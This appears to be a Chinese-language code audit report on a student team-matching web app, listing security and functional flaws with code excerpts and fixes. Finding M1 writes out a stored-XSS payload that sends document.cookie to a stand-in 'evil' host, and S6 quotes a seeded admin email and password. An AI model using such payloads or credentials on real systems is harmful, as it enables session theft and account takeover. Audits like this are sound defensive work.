# UESTC TeamUp 全栈代码审计报告

> **审计日期**：2026-09-24
> **审计范围**：`apps/api`（NestJS 10 + Prisma 5 + PostgreSQL 16 + Redis 7）、`apps/web`（Vue 3 + Pinia + Element Plus）、`packages/shared`、`deploy/`、`docker/`、`prisma/seed.ts` 及 git 历史
> **审计方法**：4 条独立审查线（前端逻辑 / 后端业务与数据库 / 接口契约 / 安全）并行全量读码，关键结论经 `tsc --noEmit` 实证与主线交叉验证
> **总体评价**：架构基础扎实（全局 fail-safe 鉴权、参数化查询、scrypt + timingSafeEqual、错误响应不泄堆栈、git 无凭据泄漏），**无 SQL 注入、无实质 CSRF 缺口**。但存在 **6 个严重级问题——其中 3 个导致生产部署形态下核心功能直接不可用，1 个当前即阻断编译**，以及一批账号接管级安全风险。

**问题统计**：

| 级别 | 数量 |
|------|------|
| 严重（Critical） | 6 |
| 高危（High） | 13 |
| 中危（Medium） | 19 |
| 低危（Low） | 23 |

---

## 目录

- [一、严重（Critical）](#一严重critical阻断构建--生产瘫痪--账号接管)
- [二、高危（High）](#二高危high)
- [三、中危（Medium）](#三中危medium)
- [四、低危（Low）](#四低危low-摘要表)
- [五、正向确认（审计通过项）](#五正向确认审计通过项)
- [六、修复优先级路线图](#六修复优先级路线图)

---

## 一、严重（Critical）——阻断构建 / 生产瘫痪 / 账号接管

### S1. 后端无法通过编译：引用不存在的 `user.contact` 字段

- **位置**：`apps/api/src/modules/users/users.service.ts:108`

```ts
studentNo: user.studentNo,
contact: user.contact,   // ← User 模型上不存在 contact
```

- **实证**：`npx tsc --noEmit` 报 `TS2339: Property 'contact' does not exist`；已核对 `schema.prisma` 的 `model User`，确无 `contact` 字段（该字段历史上属于 Team 表，已在迁移 `20260920030000` 中拆为 qq/wechat）。`pnpm build` 必然失败。
- **修复**：删除该行（`SerializableUser.contact` 为可选字段）。同步更新 `test/teams.spec.ts:22-46` 中仍使用 `contact` 的断言（当前 `pnpm test` 也必失败）。

### S2. 生产部署形态下登录完全不可用：`Secure` Cookie + nginx 仅监听 HTTP 80

- **位置**：`apps/api/src/common/auth/session.service.ts:74-82` + `deploy/nginx.conf:2` + `deploy/docker-compose.yml`（`NODE_ENV: production`）

```ts
res.cookie(SESSION_COOKIE, sid, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',  // compose 固定注入 production
  sameSite: 'lax', ...
```

```nginx
listen 80;    # 全文件无任何 TLS/443 配置
```

- **风险**：浏览器拒收非安全通道下发的 Secure Cookie → 登录接口返回 200 但会话永远种不上，**整站登录功能瘫痪**。此配置还会诱导运维关掉 `secure`，进而引入明文会话风险。nginx 已传 `X-Forwarded-Proto` 但后端从未使用。
- **修复**：nginx 补 443 + 证书（或明确 TLS 终结层）；`secure` 改由独立环境变量 `COOKIE_SECURE` 控制，与部署形态联动。**切勿以关闭 secure 作为解法**。

### S3. 登录验证码用 `Math.random()` 生成 —— 账号接管级风险

- **位置**：`apps/api/src/modules/auth/auth.service.ts:73`

```ts
const code = String(Math.floor(100000 + Math.random() * 900000));
```

- **风险**：`Math.random()`（xorshift128+）非密码学安全，输出可预测；6 位码空间仅 90 万。验证码登录是「首次即注册」通道，学号邮箱格式（`\d{8,16}@std.uestc.edu.cn`）完全可枚举——可被用于接管任意学号账号。
- **修复**：`String(crypto.randomInt(100000, 1000000))`（`node:crypto`）。

### S4. 生产默认 `MAIL_PROVIDER=console`：验证码全文写入服务器日志，且真实发信通道是抛异常的空桩

- **位置**：`deploy/docker-compose.yml:48`（`MAIL_PROVIDER: ${MAIL_PROVIDER:-console}`）、`console-dev.provider.ts:13-18`、`qq-smtp.provider.ts:15`

```ts
this.logger.log(msg.text ?? msg.html.replace(/<[^>]+>/g, ' '));  // 验证码全文进日志
// QqSmtpProvider:
throw new Error('邮件发送未接入（本次留空）...');
```

- **风险**：
  1. 任何能读 `docker logs`/日志平台的人可为**任意邮箱（含管理员）**取码直接登录；
  2. 配成 `qq` 则全站登录瘫痪（桩必抛错）；
  3. 正常用户永远收不到邮件——当前部署配置下验证码登录事实上不可用。
  4. 另 `auth.service.ts:74-85` 先写 Redis 码、占冷却锁、扣配额，之后 `mail.send` 抛错时不回滚，用户收 500 且 60 秒内无法重试。
- **修复**：上线前实装 SMTP provider；`NODE_ENV=production && provider=console` 时启动即 fail-fast（至少不打印正文）；`mail.send` 包 try/catch，失败回滚冷却锁与配额。

### S5. 管理后台竞赛编辑：`levels/tags` 返回关系对象数组，前端按字符串数组回传 → 保存必 500

- **位置**：后端 `admin.service.ts:215-220` ↔ 前端 `AdminCompetitionEdit.vue:40-51`

```ts
// 后端 adminDetail 原样返回 Prisma 行：
include: { levels: true, tags: true, timelines: true }
// → levels = [{id, competitionId, level}]（对象数组）

// 前端：
form.value = { ...c, tags: c.tags ?? [], levels: c.levels ?? [] }  // 原样回传
```

- **风险**：管理员编辑任何**已有级别/标签**的竞赛，保存时 `createMany({data: levels.map(level => ({competitionId, level}))})` 收到对象 → `PrismaClientValidationError` → 500；UI 选择器显示 `[object Object]`。公开列表接口做了字符串转换，说明 detail 是遗漏。
- **修复**：`adminDetail` 返回前 `levels: row.levels.map(l=>l.level), tags: row.tags.map(t=>t.tag)`；DTO 补 `@IsEnum(Level,{each:true})` / `@IsString({each:true})`。

### S6. seed 内置弱口令管理员（密码公开在仓库注释中），且 seed 会先清空全库

- **位置**：`apps/api/prisma/seed.ts:325-338、399-418`

```ts
// 管理员（可用密码 123456789 登录，登录后进入后台）
email: '2024080909015@std.uestc.edu.cn',
password: '123456789',
role: 'ADMIN' as const,
...
await prisma.$transaction([ prisma.notification.deleteMany(), ..., prisma.user.deleteMany() ]);
```

- **风险**：
  1. 生产库若执行过 `db:seed`（`prisma migrate reset` 也会自动触发 seed 钩子），会**删除全部生产数据**；
  2. 管理员账号 + 密码公开在源码里，等于后门；
  3. 密码登录无爆破防护（见 H3）放大该风险。
- **修复**：seed 开头 `if (NODE_ENV==='production') throw`；管理员密码从 `SEED_ADMIN_PASSWORD` 读取，缺省则不设密码（仅验证码登录）。

---

## 二、高危（High）

### H1. 学号 + 联系方式对所有登录用户全量公开，与 README「半匿名」承诺直接矛盾

- **位置**：`common/auth/viewer.context.ts:53-72`、`teams.service.ts:40-49、170-172`、`users.controller.ts:82-90`

```ts
/** 用户序列化：站内信息全部公开（学号与联系方式对所有人可见），...不再做半匿名裁剪。 */

// teams.service.ts detail(): 广告牌模式：联系方式直接公开，任何人可见
qq: team.qq, wechat: team.wechat,
```

- **风险**：README 明文承诺「陌生人只见昵称/学院/年级/专业/技能」，`docs/OPEN_QUESTIONS.md` Q8 专门警告过「公开展示 = 可被爬取的成电学生联系方式清单」。当前任意注册用户遍历 `GET /teams`（每页 60 条）即可批量收割全校学号 + QQ/微信；`SAFE_USER_SELECT` 注释声称按可见性裁剪，实现却无任何裁剪——**代码、注释、文档三方互相矛盾**。学号 + 联系方式是精准诈骗高价值数据。前端 `UserCardView.vue:53-70` 也无任何条件渲染防线。
- **修复**（需产品拍板，但不可维持现状）：恢复按 viewer 裁剪（`studentNo` 仅本人/同队/ADMIN；`ViewerContext.teamIds` 基础设施仍完整保留可直接复用）；若确认广告牌模式，则更新 README/文档、补用户协议明示，并对相关接口加限流 + 异常爬取告警。

### H2. `X-Forwarded-For` 取首段作客户端 IP：所有限流可被伪造头完全绕过

- **位置**：`auth.controller.ts:56-60` + `deploy/nginx.conf:19`（`$proxy_add_x_forwarded_for` 为**追加**模式）+ `main.ts` 未设 `trust proxy`

```ts
const xff = req.headers['x-forwarded-for'];
if (typeof xff === 'string' && xff.length > 0) return xff.split(',')[0].trim();
```

- **风险**：nginx 把客户端自带的伪造 XFF 排在最前，`split(',')[0]` 取到的正是攻击者自选值 → `DAILY_PER_IP=20` 发信限流形同虚设，可规模化轰炸全校邮箱、耗尽 QQ SMTP 日限额造成拒绝服务。反向陷阱：若直接改用 `req.ip`，因未设 trust proxy 拿到的是 nginx 容器 IP，全校共享 20 次/天额度——两头都错。
- **修复**：`main.ts` 中 `app.set('trust proxy', 1)` 后统一用 `req.ip`；或 nginx 改 `proxy_set_header X-Forwarded-For $remote_addr`（覆盖而非追加）。

### H3. 密码登录接口无任何暴力破解防护

- **位置**：`auth.service.ts:133-141`；全仓无 `@nestjs/throttler`（已 grep 确认）

```ts
async loginWithPassword(email: string, password: string) {
  ...
  if (!user || !verifyPassword(password, user.passwordHash)) {
    throw new BadRequestException('邮箱或密码不正确');
```

- **风险**：验证码路径有 5 次失败作废，密码登录却**无限次尝试、无 IP/账号锁定、无全局限流**。配合 S6 的弱密码习惯（`123456789`）与可枚举的学号邮箱，可在线字典爆破。
- **修复**：Redis 计数 `login:fail:${email}`，5 次失败锁 15 分钟（复用现有 `incrWithTtl`）；接入 ThrottlerModule 对 `/auth/*` 限速。

### H4. `pg_trgm` 扩展从未在任何迁移中创建 → 搜索接口必然 500

- **位置**：`search.service.ts:19-24`；全部 9 个迁移文件 grep `trgm|EXTENSION` 零命中（已实证）

```ts
const similar = await this.prisma.$queryRaw`
  SELECT id, similarity(name, ${query}) AS similarity
  FROM "Competition" WHERE status = 'PUBLISHED' AND name % ${query} ...`;
```

- **风险**：全新部署后 `GET /api/search` 每次抛 `function similarity(text, text) does not exist` → 500。README 宣称的「pg_trgm 模糊搜索」实际不可用。
- **修复**：新增迁移 `CREATE EXTENSION IF NOT EXISTS pg_trgm;`，顺手给 `Competition.name` 加 GIN trgm 索引。

### H5. 重置/修改密码后不吊销既有会话

- **位置**：`auth.service.ts:147-164、167-182`

```ts
await this.prisma.user.update({ where: { email }, data: { passwordHash: hashPassword(newPassword) } });
return { ok: true };   // 没有 sessions.destroyByUserId(user.id)
```

- **风险**：重置密码的典型场景是「账号可能被盗」，但攻击者已持有的 session 在 Redis TTL（168h）内继续有效——受害者改完密码仍被持续控制。封禁流程已有 `destroyByUserId`（`users.service.ts:178`），此处纯属遗漏。
- **修复**：`resetPassword`/`setPassword` 成功后调用 `sessions.destroyByUserId(user.id)`。

### H6. 验证码机制可被用作定向 DoS + 注册状态枚举

- **位置**：`auth.service.ts:57-64`

```ts
const cooldown = await this.redis.lock(cooldownKey, RESEND_COOLDOWN); // 按邮箱冷却
if (!cooldown) throw new BadRequestException('发送太频繁，请 1 分钟后再试');
...
if (emailCount > DAILY_PER_EMAIL) throw new BadRequestException('该邮箱今日发送次数已达上限');
```

- **风险**：
  1. 攻击者对目标邮箱每 60 秒请求一次发码，受害者**永远处于冷却**无法登录（验证码是唯一首次注册通道）；
  2. 报错文案区分「该邮箱今日发送次数已达上限」，配合 5 次发送可探测邮箱是否已注册，削弱代码注释宣称的防枚举。
- **修复**：冷却命中时静默返回与成功一致的响应（或同窗口复用已生成的码）；超限报错统一文案。

### H7. 个人中心「修改密码」功能不可用：`hasPassword` 读取路径错误

- **位置**：前端 `ProfileView.vue:37-38` ↔ 后端 `auth.controller.ts:147-159`（已实证）

```ts
const me2 = await api.get<{ hasPassword?: boolean }>('/auth/me');
hasPassword.value = !!me2?.hasPassword;   // 后端实际返回 { user: { hasPassword } }
```

- **风险**：`hasPassword` 恒为 false → UI 永远显示「未设置密码」、不渲染当前密码输入框 → 已设密码用户提交时被后端 400「请输入当前密码」拒绝，**修改密码流程死锁**。对照：`LoginView.vue:153` 用的是 `auth.user.hasPassword`（来自 store 正确解析的 `res.user`），是对的。
- **修复**：改为 `me2?.user?.hasPassword`，或直接复用 store 中 `auth.user.hasPassword`（省掉第二次请求）。

### H8. 未读通知筛选在分页之后做客户端过滤 —— 功能错误

- **位置**：`NotificationsView.vue:19-27`（已实证）

```ts
const res = await api.get(`/notifications?page=${page.value}&pageSize=20`);
items.value = filter.value === 'ALL' ? res.items : res.items.filter((i) => !i.readAt);
```

- **风险**：只对当前页 20 条过滤未读，`total` 仍是全部消息数——未读列表残缺甚至为空、翻页逻辑完全错位；切换筛选时 `page` 也不重置。
- **修复**：未读筛选下发为查询参数由后端过滤分页；切换 filter 时 `page.value = 1`。

### H9. 竞赛列表每个按键触发请求 + 全项目无竞态防护

- **位置**：`CompetitionListView.vue:52-57`

```ts
watch(filters, () => { page.value = 1; syncUrl(); load(); });  // filters.q 绑定搜索框 v-model
watch(page, load);
```

- **风险**：reactive 对象隐式深度 watch，**每敲一个字符发一次请求**；全项目无任何 `AbortController`（已全局 grep 确认），响应乱序时慢的旧请求覆盖新结果。另有三处双重加载（`watch(page)` 联动、排序 `@change="load"` 与 watch 重复、route.query watcher 手动 load 后再被触发）；`load()` 只有 `try/finally` 无 catch，失败即未处理 rejection。
- **修复**：搜索输入 300ms 防抖；自增 requestId 或 AbortController 丢弃过期响应；去重触发源；补 catch。

### H10. 系统性未处理 Promise 拒绝：ElMessageBox 取消 + 管理操作无 try/catch（全站 15+ 处）

- **位置**（同一模式 6 处确认）：`TeamDetailView.vue:68-78`、`AdminUsersView.vue:39-56`、`AdminCompetitionsView.vue:44-48`、`AdminAnnouncementsView.vue`、`AdminReportsView.vue`、`AdminRevisionsView.vue`

```ts
await ElMessageBox.confirm(...);   // 点"取消"即 reject，无外层 catch
try { await api.post(...) } catch (e) { ... }
```

- **风险**：用户点取消 → 控制台抛 `Uncaught (in promise) cancel`；更严重的是 `AdminUsersView.setRole`、`AdminCorrectionsView.review`、`AdminAnnouncementsView.toggle` 的 **API 调用完全无 try/catch**——封禁/改角色/采纳纠错失败时无任何反馈，管理员以为已成功。
- **修复**：统一 `try { await confirm } catch { return }`；所有写操作补 catch + `ElMessage.error`。

### H11. 管理员角色切换：下拉误触即改 + 无自我降级保护 + 后端无「最后管理员」兜底 → 后台可被永久锁死

- **位置**：前端 `AdminUsersView.vue:88-95`（`el-select @change` 直接 `setRole`，对比封禁有确认弹窗）；后端 `users.service.ts:183-186`（`ban()` 有「不能封禁自己/管理员」保护，`setRole` 却没有任何保护）；DTO `users.controller.ts:45-48` 仅 `@IsString()`

```html
<el-select :model-value="row.role" size="small" @change="(v: string) => setRole(row, v)">
```

- **风险**：
  1. 管理员把自己降为 STUDENT 后立刻失去后台入口，且系统无其他途径产生 ADMIN → **后台永久锁死**；
  2. 传 `role: "SUPERUSER"` 穿透到 Prisma 枚举 → 500。
- **修复**：前端加确认弹窗并禁止修改自己的角色；后端 `@IsEnum(UserRole)` + 拒绝自我降级 + 降级前检查 `count({where:{role:'ADMIN'}}) > 1`。

### H12. 队伍留言回复通知硬编码跳竞赛页 → 404

- **位置**：前端 `NotificationsView.vue:64-65` ↔ 后端 `comments.service.ts:43-47`（payload 含 `targetType`，可为 TEAM）

```ts
case 'COMMENT_REPLY':
  return { ..., link: `/competitions/${p.targetId}` };  // TEAM 评论也跳竞赛页
```

- **风险**：招募帖下的留言回复通知点击后 404，被弹回列表页。同文件 53-61 行还残留 `APPLICATION_*`/`INVITATION_*` 死分支（枚举已在 shared 中删除）。
- **修复**：按 `p.targetType` 分流 `TEAM → /teams/:id`；删除失效分支。

### H13. 游客访问用户名片页 `/u/:id`：后端要求登录、前端无守卫 → 401 未处理 + 整页空白

- **位置**：后端 `users.controller.ts:82-90`（`@Get(':id')` 无 `@Public()`）↔ 前端 `router/index.ts:28`（无 `meta.auth`）+ `UserCardView.vue:28-39`（无 catch、无错误态分支）

- **风险**：未登录用户打开分享的名片链接 → 401 → unhandled rejection → 整页空白无引导。与后端序列化器注释「站内信息全部公开」的设计意图也自相矛盾。
- **修复**：二选一并两端一致：(a) 后端加 `@Public()`（符合 H1 裁剪修复后的公开名片设计）；(b) 前端加 `meta.auth` + 错误态 UI。

---

## 三、中危（Medium）

### M1. `officialUrl` 纠错值可注入 `javascript:` URL，管理员采纳后形成存储型 XSS

- **位置**：提交 `corrections.service.ts:6-14`（白名单含 officialUrl，无 scheme 校验）→ 写入 `admin.service.ts:288-291` → 渲染 `CompetitionDetailView.vue:166`

```html
<a v-if="comp.officialUrl" :href="comp.officialUrl" target="_blank" rel="noopener">访问官网 ↗</a>
```

- **风险**：任意用户提交纠错 `field=officialUrl, proposedValue=javascript:fetch('//evil/'+document.cookie)`，管理员在纠错处理台未细看即「采纳」→ 所有访客点击「访问官网」执行脚本，可发起任意同源 API 调用（改密/发帖/提权操作）。同页 `sourceUrl`（L153）与 `materials` 的 `m.url`（L298）同模式渲染。DTO 侧 `@IsString()` 无 `@IsUrl()` 约束。
- **修复**：三层任选其二以上——① DTO 对 URL 字段加 `@IsUrl({ protocols: ['https', 'http'] })`；② `reviewCorrection` 采纳前校验 scheme；③ 前端封装 `safeHref()`（仅放行 http/https）。

### M2. 任意登录用户可无审核创建 PUBLISHED 竞赛条目（数据污染向量）

- **位置**：`teams.service.ts:396-415`

```ts
const existing = await this.prisma.competition.findFirst({ where: { name } });
if (existing) { competitionId = existing.id; }
else {
  const created = await this.prisma.competition.create({
    data: { name, sourceUrl: '用户手动填写', status: 'PUBLISHED' },
```

- **风险**：发帖填任意 `competitionName`（≤120 字，无内容校验）即以 PUBLISHED 写入竞赛库，直接出现在公开列表/日历/搜索/首页统计，污染「56 项认定清单」核心卖点；`findFirst→create` 无唯一约束兜底，并发下重复建档。
- **修复**：自动建档改 `DRAFT` + 管理员审核队列（`CRAWL_ANOMALY` 通知通道已有）；`Competition.name` 加唯一索引，create 用 upsert / 捕获 P2002。

### M3. DEADLINE 排序的分页契约被破坏（total 与 items 不一致）

- **位置**：`competitions.service.ts:95-118`

```ts
take: query.pageSize * 4, // DEADLINE 排序需要多一点候选
...
if (query.sort === 'DEADLINE') {
  items = items.filter((i) => i.nextDeadline).sort(...).slice(0, query.pageSize);
}
```

- **风险**：DB 层按 `updatedAt desc` 取当页 4×pageSize 候选，再内存过滤排序切片——跨页全局顺序错乱，第 2 页起重复/遗漏；`total` 返回全量 count 虚高，`el-pagination` 页码失效。
- **修复**：排序下推数据库（冗余 `nextSignupDeadlineAt` 物化字段由写路径维护），或 total 按同条件计算。

### M4. Redis `allkeys-lru` + 48MB 上限：会话与限流计数可被逐出

- **位置**：`deploy/docker-compose.yml:26`

```yaml
command: ["redis-server", "--maxmemory", "48mb", "--maxmemory-policy", "allkeys-lru", "--appendonly", "no"]
```

- **风险**：session/验证码/限流/锁同库。内存满后 LRU **无差别逐出**：活跃用户随机登出；攻击者可故意灌数据（大量发码/建 session）把限流键逐出，**重置全部限流**。
- **修复**：改 `volatile-lru`（现有键均带 TTL）或 `noeviction`；为 session 与限流考虑分库/分实例。

### M5. 三处 check-then-act 并发竞态，P2002 未处理 → 500 或约束被绕过

- **位置与代码**：
  - `favorites.service.ts:10-22`：`findUnique` 后 `create`，并发双击收藏 → 唯一键冲突 P2002 → 500（而非幂等成功）
  - `comments.service.ts:101-121`：事务内 `findUnique→create`，两个并发请求都查到「未点赞」→ 第二个撞联合主键 500（事务不能防止两个并发事务都通过读检查）
  - `teams.service.ts:207-216`：活跃帖上限 5 与 24h 去重都在事务外先查后写，并发 6 个请求可全部通过 → 超上限/重复帖
- **修复**：favorites/comments 用 `upsert` 或 catch P2002 转幂等；teams.create 将 count+create 包进 `Serializable` 事务或加 Redis 锁 `lock('team:create:'+userId)`。

### M6. Cron 时区错误 + DDL 提醒三重 N+1 + 无防重入

- **位置**：`jobs.service.ts:19-61`；`deploy/docker-compose.yml`、`docker/Dockerfile.api` 无 TZ 设置（已 grep 确认）

```ts
@Cron('0 5 8 * * *')   // 期望北京时间 08:05
async ddlReminders() {
  for (const d of days) {
    const timelines = await this.prisma.competitionTimeline.findMany({...});
    for (const tl of timelines) {
      const favs = await this.prisma.favorite.findMany({...});
      for (const fav of favs) {
        const dup = await this.prisma.notification.findFirst({
          where: { ..., payload: { path: ['timelineId'], equals: tl.id } },
```

- **风险**：
  1. 容器默认 UTC，实际**北京时间 16:05** 触发，「早上提醒看 DDL」变下午；
  2. 三重循环逐条查询（N+1），dup 检查走 JSON path 且无索引，关注量大时单次 job 数千次扫描级查询；
  3. 未过滤 `competition.status = 'PUBLISHED'`，已下线竞赛仍发提醒；
  4. 无分布式锁/防重入，多实例部署重复发送（dup 检查是 check-then-insert，跨实例竞态）；
  5. 当天 08:05 宕机则提醒永久错过（±1h 窗口无补偿）。
- **修复**：`@Cron('0 5 8 * * *', { timeZone: 'Asia/Shanghai' })`；批量取回后内存判重；job 入口加 `redis.lock('job:ddl', 3600)`。

### M7. 会话过期无全局处理，UI 长期显示「假登录」

- **位置**：`api/client.ts:27-29` + `stores/auth.ts`
- **风险**：client 对 401 无任何钩子；store 的 `user` 只在主动 refresh/logout 时清空。服务端 session 过期（TTL 168h）后：AppNav 每 30s 轮询静默失败（catch 吞掉），导航仍显示已登录，所有操作持续报错，用户只能手动刷新页面。
- **修复**：client.ts 检测 401 → 清空 auth store 并跳转登录（带 redirect）。

### M8. 登出失败则无法登出

- **位置**：`stores/auth.ts:43-46` + `AppNav.vue:47-50`

```ts
async function logout() { await api.post('/auth/logout'); user.value = null; }
```

- **风险**：API 失败（网络/500）时 `user.value` 永不清空且 rejection 未处理（`doLogout` 也无 catch）——断网时点「退出登录」毫无反应。
- **修复**：`try { await api.post(...) } finally { user.value = null }`。

### M9. 首页「本月节点」时区 bug + `daysLeft` 口径混乱（直接影响「DDL 提醒」核心卖点）

- **位置**：
  - `HomeView.vue:28-38`：`new Date("2026-09-30")` 按 **UTC 零点**解析，东八区等于 9-30 08:00 本地时间 → 当月最后一天 08:00 之后的节点全部被过滤掉
  - `types.ts:161-164`：`Math.ceil((new Date(endAt).getTime() - Date.now()) / 86400_000)` 按毫秒差取整而非日历天——今晚 23:59 截止显示「剩 1 天」而非「今天截止」；已过期为负数，`CompetitionDetailView.vue:134` 的 `daysLeft(...)! > 0 ? ... : '今日截止'` 会把**已过期**显示成「今日截止」
  - `teams.service.ts:95,109`：后端 `new Date('YYYY-MM-DD')` 同样按 UTC 解析——北京时间截止日当天 08:00 起 `expired=true`（前端却显示「今天截止」）
- **修复**：前端统一 `dayjs(endAt).startOf('day').diff(dayjs().startOf('day'), 'day')`；后端按 `Asia/Shanghai` 解析 date-only 值（如 `new Date(s+'T23:59:59+08:00')`）。

### M10. PATCH 编辑无法清空已填字段

- **位置**：`TeamDetailView.vue:141-148`

```ts
qq: editForm.value.qq.trim() || undefined,
wechat: editForm.value.wechat.trim() || undefined,
deadline: editForm.value.deadline || undefined,
```

- **风险**：空串被转成 `undefined`，JSON 序列化后字段消失。后端将「字段缺失」视为不更新（PATCH 常规语义）→ 队长**永远无法删除已填的微信或截止日期**。同类：`targetSize: ... ?? undefined`。
- **修复**：显式传 `null` 表示清空，与后端约定语义。

### M11. `skills` 缺嵌套校验可触发 500

- **位置**：`users.controller.ts:34-36` + `users.service.ts:75-86`

```ts
@IsOptional()
@IsArray()
skills?: { skill: string; level?: number }[];   // 无 @ValidateNested/@Type
```

- **风险**：`@IsArray()` 不校验元素。传 `skills: [123]` → `s.skill.trim is not a function` → 500；传重复 skill → `createMany` 撞复合主键 P2002 → 500。
- **修复**：定义 `SkillDto` + `@ValidateNested({each:true}) @Type(()=>SkillDto)`；service 内对 skill 去重。

### M12. 评论删除非事务 + 多态评论孤儿数据 + 管理员无法删违规评论本体

- **位置**：`comments.service.ts:124-131`、`admin.service.ts:180-185`、`reports.service.ts:105-115`、`schema.prisma:458`

```ts
await this.prisma.comment.delete({ where: { id } });
await this.prisma.comment.deleteMany({ where: { parentId: id } });   // 两步无事务
```

- **风险**：
  1. 两步之间失败留下挂在已删根评论下的回复（永不可见但占存储/计数）；
  2. `deleteTeam`/举报删帖硬删 Team 后，`Comment(targetType=TEAM)` 无外键级联（schema 注释自认「应用层维护」），全部变孤儿；
  3. 只有作者能删评论，**管理员无法直接删除违规评论本体**（只能绕举报通道，而举报 handle 里删评论又是两条无事务）。
- **修复**：包 `$transaction`；删 Team 时同步清理 comment/favorite；删评论权限改 `ADMIN || authorId===userId`。

### M13. `COOKIE_SECRET` 是死配置，造成「Cookie 已签名」的错觉

- **位置**：`deploy/docker-compose.yml:47`（`${COOKIE_SECRET:?}` 强制要求）↔ `main.ts:13` `cookieParser()` 无参调用、全仓零引用（已实证）
- **风险**：运维以为会话 cookie 有签名防篡改，实际没有——好在 sid 本身是 24 字节随机数且存 Redis，篡改无意义，属**误导性配置**而非直接漏洞。
- **修复**：删除该环境变量，或真正用于 signed cookie。

### M14. 无 helmet、nginx 无安全响应头、无全局接口限流

- **位置**：`main.ts:9-26`、`deploy/nginx.conf`（全文无 `add_header X-*`/CSP/HSTS）
- **风险**：缺失 `X-Content-Type-Options`、`X-Frame-Options`/CSP `frame-ancestors`（点击劫持）、HSTS、Referrer-Policy；API 层无通用限流，评论/纠错/举报接口仅靠业务内局部限制（评论完全无限制，可脚本刷屏）。
- **修复**：`app.use(helmet())`；nginx 增加安全头；UGC 写接口加 throttler 或 Redis 计数限流。

### M15. 管理员看他人招募帖：`isLeader=true` 但所有写操作 403

- **位置**：`teams.service.ts:161` ↔ `mustOwn`（`teams.service.ts:454-459`）↔ `TeamDetailView.vue:219-229`

```ts
const isLeader = viewerId != null && (team.leaderId === viewerId || viewerRole === 'ADMIN');
// 但 update/setStatus 走 mustOwn，仅认 leaderId
```

- **风险**：管理员打开任意招募帖会看到「编辑帖子/解散」按钮，点击后全部 403「只有发帖人可以操作」。字段语义（isLeader）与实际权限不一致。
- **修复**：返回 `viewer: { isLeader, isAdmin }` 两字段，前端仅对 isLeader 显示编辑控件；或让 mustOwn 放行 ADMIN（需产品决策）。

### M16. `/auth/me` 的 skills 恒为空数组

- **位置**：`session.service.ts:39`（`findUnique` 不 include skills）→ `auth.controller.ts:153` → `viewer.context.ts:69` `skills: (user.skills ?? []).map(...)` → 恒为 `[]`
- **风险**：前端 `stores/auth.ts:11` 的 `MeUser.skills` 声明为必有字段——隐性契约谎言，后续开发依赖 `auth.user.skills` 必拿到空数据。
- **修复**：resolve 时 include skills，或 `/auth/me` 单独查一次；至少在前端类型上标注不可靠。

### M17. dev 验证码「随响应回显」前端永远拿不到（联调功能失效）

- **位置**：`transform.interceptor.ts:11-14`（`dev` 提升到信封顶层 `{code:0, data, dev}`）↔ `client.ts:27-30`（成功路径只 `return body.data`，**丢弃 `body.dev`**）；`LoginView.vue:86` 的 `fpDevCode` 声明后从未赋值使用
- **风险**：README 宣称「dev 模式验证码随响应回显」，实际前端无任何途径读取，只能看后端控制台。功能声明与实现不符。
- **修复**：`request()` 成功时把 `body.dev` 挂到返回值或单独导出；或删除回显机制与文档描述。

### M18. 收藏列表空指针崩溃点 + 公开页无兜底

- **位置**：`MyFavoritesView.vue`（`{{ f.team.competition.name }}`——发帖支持手动填写竞赛名且竞赛可被下线，一旦返回 `competition: null` 渲染即 TypeError 白屏；`unfavByIndex` 无 try/catch）；`UserCardView.vue:28-39、53-70`（onMounted 无 catch，接口失败 → `user=null` 且无 `v-else` 分支 → 整页空白；`user.skills.length` 无兜底）
- **修复**：`f.team.competition?.name ?? '（竞赛已下线）'`；补错误态 UI 与 `skills ?? []` 兜底；unfav 补 catch。

### M19. 登录页冷却计时器不随组件卸载清理

- **位置**：`LoginView.vue:24-34、105-115`
- **风险**：`timer`/`fpTimer` 两个 `setInterval` 只在倒计时归零时自清，无 `onUnmounted` 清理。验证码倒计时 60s 内离开登录页，interval 继续持有已卸载组件的 ref 运行；开发环境 HMR 会叠加多个计时器。
- **修复**：`onUnmounted(() => { clearInterval(timer); clearInterval(fpTimer); })`。

---

## 四、低危（Low）—— 摘要表

| # | 位置 | 问题 | 修复 |
|---|------|------|------|
| L1 | `radar.controller.ts:18,48-51` + `calendar.service.ts:11-18` | `levels` 非法值、`start/end` 非法日期穿透到 Prisma → 500 而非 400 | `@IsEnum(Level,{each:true})`、`@IsDateString()` |
| L2 | `competitions.service.ts:66`、`search.service.ts:28`、`users.service.ts:135` | Prisma `contains` 在 PG 大小写敏感，搜 "icpc" 匹配不到 "ICPC"（注释声称 ILIKE 与实现不符） | 加 `mode: 'insensitive'` |
| L3 | `auth.service.ts:69-70、196-198` | 每分钟限流 key = `YYYYMM+HHMM` 缺「日」位（靠 120s TTL 掩盖）；冷却锁在配额检查**之前**占用，被拒也触发 60s 冷却 | key 补全 `YYYYMMDDHHMM`；先查配额再上锁 |
| L4 | `competitions.service.ts:135` | `@Public` 详情接口只挡 ARCHIVED，持有 DRAFT id 可读未发布竞赛全量数据 | 非管理员且 `status !== 'PUBLISHED'` 一律 404 |
| L5 | `admin.service.ts:174-185` | archive/deleteTeam 对不存在 id → P2025 500 而非 404 | 先 findUnique 判空 |
| L6 | `admin.controller.ts:54-57` + `admin.service.ts:312` | `CorrectionReviewDto.action` 仅 `@IsString`（任意值当 reject）；采纳通知复用 `CORRECTION_NEW` kind 语义错误（「新纠错」vs「已采纳」） | `@IsIn(['accept','reject'])`；新增 kind |
| L7 | `common/password.ts:11,19` | `scryptSync` 同步阻塞事件循环（每次 50-100ms），登录高峰卡住整个进程 | 改异步 `crypto.scrypt` |
| L8 | `session.service.ts:50-57` | `destroyByUserId` SCAN 全量会话逐条 `JSON.parse`（无 try/catch，脏数据令封禁 500），O(全部会话) | 维护 `user_sessions:{uid}` 索引集合 |
| L9 | `comments.service.ts:54-68` | 根评论固定 take:50 无翻页；回复**无上限**且 `include author` 全字段（含 passwordHash，靠 stripAuthor 兜底）——over-fetch 反模式 | 回复分页；`author: { select }` 白名单 |
| L10 | `announcements.service.ts:21-40`、`reports.service.ts:100-118` | 公告「下线+创建+全员通知」三步无事务；全员 createMany 不分块（万级用户单条巨型 INSERT）；举报处理无事务 | 包事务；每 1000 条分块 |
| L11 | `calendar.service.ts:62` | ICS `esc()` 未转义 `\r`，竞赛名含 CR 可注入伪造 ICS 行 | 正则补 `\r` |
